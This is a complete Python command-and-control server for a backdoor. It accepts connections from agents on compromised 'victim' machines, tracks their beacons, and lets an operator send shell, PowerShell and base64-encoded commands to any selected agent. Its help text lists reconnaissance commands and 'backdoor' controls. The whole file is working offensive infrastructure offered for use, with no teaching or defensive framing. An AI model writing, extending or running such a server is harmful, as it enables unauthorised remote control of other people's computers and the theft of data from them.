import socket
import threading
import os
import sys
import time

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.clients = {}  # {agent_id: socket}
        self.agent_info = {}  # {agent_id: {info: str, last_active: timestamp}}
        self.lock = threading.Lock()
        self.running = True
        self.active_agent_id = None

    def start(self):
        try:
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            print(f"[+] C2 Server listening on {self.host}:{self.port}")
            print("[+] Waiting for agents to connect...")
            self.accept_loop()
        except Exception as e:
            print(f"[!] Server error: {e}")

    def accept_loop(self):
        while self.running:
            try:
                client, addr = self.server.accept()
                with self.lock:
                    agent_id = f"Agent-{len(self.clients) + 1}"
                    self.clients[agent_id] = client
                    self.agent_info[agent_id] = {
                        "addr": addr,
                        "connected_at": time.time(),
                        "beacon": "No Beacon"
                    }
                
                print(f"\n[+] New connection from {addr[0]}:{addr[1]} | Assigned ID: {agent_id}")
                
                # Start a thread to handle this client's incoming data
                thread = threading.Thread(target=self.handle_incoming, args=(client, agent_id))
                thread.daemon = True
                thread.start()
                
            except Exception as e:
                print(f"[!] Accept error: {e}")

    def handle_incoming(self, client, agent_id):
        """Handles data coming FROM the victim."""
        buffer = b""
        try:
            while self.running:
                data = client.recv(4096)
                if not data:
                    break
                
                buffer += data
                while b"\n" in buffer:
                    line, buffer = buffer.split(b"\n", 1)
                    if not line.strip():
                        continue
                    
                    raw = line.decode('utf-8', errors='ignore')
                    
                    # Update beacon info if it's a BEACON message
                    if raw.startswith("BEACON"):
                        self.agent_info[agent_id]["beacon"] = raw
                        print(f"\n[{agent_id}] BEACON: {raw}")
                        continue

                    # If this is the active agent, print the output
                    if self.active_agent_id == agent_id:
                        self.print_clean_output(agent_id, raw)
                        
        except Exception as e:
            print(f"[{agent_id}] Connection error: {e}")
        finally:
            with self.lock:
                if agent_id in self.clients:
                    del self.clients[agent_id]
                    del self.agent_info[agent_id]
                    if self.active_agent_id == agent_id:
                        self.active_agent_id = None
            client.close()
            print(f"\n[{agent_id}] Disconnected.")

    def parse_response(self, raw_data):
        """Parses the raw data into clean stdout/stderr."""
        result = {"exit": None, "stdout": "", "stderr": ""}
        
        if raw_data.startswith("EXIT:"):
            parts = raw_data.split("\n", 2)
            if len(parts) >= 1:
                try:
                    result["exit"] = int(parts[0].split(":")[1])
                except:
                    result["exit"] = -1
            if len(parts) >= 2:
                if parts[1].startswith("STDOUT:"):
                    result["stdout"] = parts[1][7:]
                elif parts[1].startswith("STDERR:"):
                    result["stderr"] = parts[1][7:]
            if len(parts) >= 3:
                if parts[2].startswith("STDERR:"):
                    result["stderr"] = parts[2][7:]
                elif parts[2].startswith("STDOUT:"):
                    result["stdout"] = parts[2][7:]
        
        elif raw_data.startswith("PONG"):
            result["stdout"] = "PONG"
        else:
            result["stdout"] = raw_data
            
        return result

    def print_clean_output(self, agent_id, raw_data):
        """Prints clean output for the active agent."""
        response = self.parse_response(raw_data)
        
        # Don't print empty lines
        if not response["stdout"] and not response["stderr"] and response["exit"] is None:
            return

        if response["stdout"]:
            print(f"[{agent_id}] $ {response['stdout']}")
        if response["stderr"]:
            print(f"[{agent_id}] ! {response['stderr']}")
        if response["exit"] is not None and response["exit"] != 0:
            print(f"[{agent_id}] [Exit Code: {response['exit']}]")

    def send_command(self, agent_id, command):
        """Sends a command to a specific agent."""
        with self.lock:
            if agent_id not in self.clients:
                print(f"[!] Agent {agent_id} not found.")
                return False
            client = self.clients[agent_id]
        
        # Auto-prepend CMD: if not already present
        if not command.startswith("CMD:") and not command.startswith("b64:"):
            command = f"CMD: {command}"
            
        try:
            client.sendall((command + "\n").encode('utf-8'))
            return True
        except Exception as e:
            print(f"[!] Failed to send command to {agent_id}: {e}")
            return False

    def list_agents_menu(self):
        """Displays the agent selection menu."""
        print("\n" + "="*40)
        print(" AGENT SELECTION MENU")
        print("="*40)
        with self.lock:
            if not self.clients:
                print(" No agents currently connected.")
                print("-"*40)
                return None

            print(f" {len(self.clients)} Active Agent(s):")
            for i, (agent_id, info) in enumerate(self.agent_info.items(), 1):
                beacon_short = info["beacon"][:50] + "..." if len(info["beacon"]) > 50 else info["beacon"]
                print(f" [{i}] {agent_id} - {info['addr'][0]} | {beacon_short}")
            print("-"*40)
            print(" Type agent number to select, 'q' to quit menu.")
            print("="*40)
            
            choice = input("Select Agent> ").strip()
            if choice.lower() == 'q':
                return None
            try:
                idx = int(choice)
                agent_ids = list(self.agent_info.keys())
                if 1 <= idx <= len(agent_ids):
                    return agent_ids[idx-1]
                else:
                    print("[!] Invalid selection.")
                    return None
            except ValueError:
                print("[!] Invalid input.")
                return None

    def interactive_mode(self):
        """Main interactive loop with agent switching."""
        print("\n" + "="*40)
        print(" C2 OPERATOR CONSOLE")
        print("="*40)
        print("Commands:")
        print("  agents       : Show agent selection menu")
        print("  switch <id>  : Switch to a specific agent (e.g., switch Agent-1)")
        print("  list         : List all connected agents")
        print("  help         : Show command reference")
        print("  exit         : Exit the C2 server")
        print("-"*40)
        
        while self.running:
            # Determine prompt based on active agent
            if self.active_agent_id:
                prompt = f"[{self.active_agent_id}] C2> "
            else:
                prompt = "C2> "
            
            try:
                user_input = input(prompt).strip()
                
                if not user_input:
                    continue
                
                if user_input.lower() == 'exit':
                    self.running = False
                    break
                elif user_input.lower() == 'help':
                    self.show_help()
                elif user_input.lower() == 'list':
                    self.list_agents_simple()
                elif user_input.lower() == 'agents':
                    selected = self.list_agents_menu()
                    if selected:
                        self.active_agent_id = selected
                        print(f"[+] Switched to {selected}.")
                elif user_input.startswith('switch '):
                    target_id = user_input.split(' ', 1)[1]
                    with self.lock:
                        if target_id in self.clients:
                            self.active_agent_id = target_id
                            print(f"[+] Switched to {target_id}.")
                        else:
                            print(f"[!] Agent {target_id} not found.")
                else:
                    # Send command to active agent
                    if self.active_agent_id:
                        self.send_command(self.active_agent_id, user_input)
                    else:
                        print("[!] No active agent. Use 'agents' to select one.")
                        
            except KeyboardInterrupt:
                print("\n[!] Interrupted. Shutting down...")
                break
            except EOFError:
                break

    def list_agents_simple(self):
        with self.lock:
            if not self.clients:
                print("[!] No agents currently connected.")
            else:
                print(f"[+] {len(self.clients)} Active Agent(s):")
                for agent_id, info in self.agent_info.items():
                    active_marker = " (Active)" if self.active_agent_id == agent_id else ""
                    print(f"    - {agent_id}{active_marker} - {info['addr'][0]}")

    def show_help(self):
        print("""
        C2 COMMAND REFERENCE
        ---------------------
        1. Agent Management:
           agents       : Open the agent selection menu
           switch <id>  : Switch to a specific agent (e.g., switch Agent-1)
           list         : List all connected agents
           
        2. Basic Commands (Sent to Active Agent):
           whoami             : Execute 'whoami'
           dir                : List directory contents
           ipconfig /all      : Show network configuration
           
        3. PowerShell Commands:
           powershell -c "Get-Process" : Run a PowerShell command
           
        4. Base64 Commands:
           b64: <base64_string> : Execute a base64 encoded command
           
        5. Special Backdoor Commands:
           PING:              : Test connectivity
           EXIT:              : Kill the backdoor process on the victim
        """)

if __name__ == "__main__":
    server = C2Server()
    
    # Run the server in a background thread
    accept_thread = threading.Thread(target=server.start, daemon=True)
    accept_thread.start()
    
    # Wait a moment for the server to start listening
    time.sleep(1)
    
    # Start the interactive mode in the main thread
    server.interactive_mode()